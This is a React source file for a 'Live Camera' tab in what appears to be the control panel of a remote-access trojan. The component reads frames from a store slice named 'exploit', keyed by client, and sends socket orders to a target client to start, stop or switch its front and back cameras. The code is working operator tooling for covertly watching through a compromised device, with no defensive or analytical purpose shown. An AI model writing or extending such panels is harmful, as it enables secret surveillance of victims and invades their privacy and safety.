
import { useEffect, useRef, useState } from 'react'
import { Button } from '@/components/ui/button'
import { Camera, SwitchCamera, Square, Play, Loader2 } from 'lucide-react'
import { emitOrder } from '@/lib/socket'
import { useAppSelector } from '@/store/hooks'

export function CameraTab({ clientId }: { clientId: string }) {
  const image = useAppSelector((s) => s.exploit.byClient[clientId]?.cameraImage)
  const [streaming, setStreaming] = useState(false)
  const [cam, setCam] = useState<0 | 1>(0)
  const streamingRef = useRef(streaming)
  useEffect(() => {
    streamingRef.current = streaming
  }, [streaming])
  // derived: "connecting" while streaming but no frame yet
  const connecting = streaming && !image

  useEffect(() => {
    return () => {
      if (streamingRef.current) emitOrder(clientId, 'stop_camera')
    }
  }, [clientId])

  const start = (cameraId: 0 | 1 = cam) => {
    setCam(cameraId)
    setStreaming(true)
    emitOrder(clientId, 'camera', { camera_id: cameraId, quality: 40 })
  }
  const stop = () => {
    setStreaming(false)
    emitOrder(clientId, 'stop_camera')
  }

  return (
    <div className="space-y-4">
      <div className="flex items-center justify-between">
        <div className="flex items-center gap-2">
          <Camera className="h-4 w-4 text-emerald-400" />
          <h3 className="text-sm font-semibold text-zinc-100">Live Camera</h3>
        </div>
        <span
          className={`text-xs font-medium ${
            streaming ? 'text-emerald-400' : 'text-zinc-500'
          }`}
        >
          {streaming ? (connecting ? 'Connecting…' : 'Streaming') : 'Offline'}
        </span>
      </div>

      <div className="relative aspect-video w-full max-w-2xl overflow-hidden rounded-xl border border-white/10 bg-black/60 grid place-items-center">
        {image ? (
          <img
            src={`data:image/jpeg;base64,${image}`}
            alt="live camera"
            className="h-full w-full object-cover"
          />
        ) : streaming && connecting ? (
          <div className="flex flex-col items-center gap-2 text-zinc-500">
            <Loader2 className="h-6 w-6 animate-spin text-emerald-400" />
            <span className="text-xs">Connecting to camera…</span>
          </div>
        ) : (
          <div className="flex flex-col items-center gap-2 text-zinc-600">
            <Camera className="h-8 w-8" />
            <span className="text-xs">Stream offline</span>
          </div>
        )}
        {streaming && (
          <span className="absolute left-2 top-2 inline-flex items-center gap-1 rounded bg-black/60 px-2 py-0.5 text-[10px] text-emerald-400">
            <span className="h-1.5 w-1.5 rounded-full bg-emerald-400 pulse-emerald" />
            REC · CAM{cam}
          </span>
        )}
      </div>

      <div className="flex flex-wrap gap-2">
        {!streaming ? (
          <Button
            onClick={() => start()}
            className="bg-emerald-500 hover:bg-emerald-400 text-zinc-950 font-semibold"
          >
            <Play className="h-4 w-4" /> Start Stream (Front)
          </Button>
        ) : (
          <Button
            onClick={stop}
            className="bg-rose-500/90 hover:bg-rose-500 text-white font-semibold"
          >
            <Square className="h-4 w-4" /> Stop Stream
          </Button>
        )}
        <Button
          variant="outline"
          onClick={() => streaming && start(cam === 0 ? 1 : 0)}
          disabled={!streaming}
          className="bg-transparent border-white/15 text-zinc-300 hover:bg-white/5"
        >
          <SwitchCamera className="h-4 w-4" /> Switch to {cam === 0 ? 'Back' : 'Front'}
        </Button>
      </div>
    </div>
  )
}
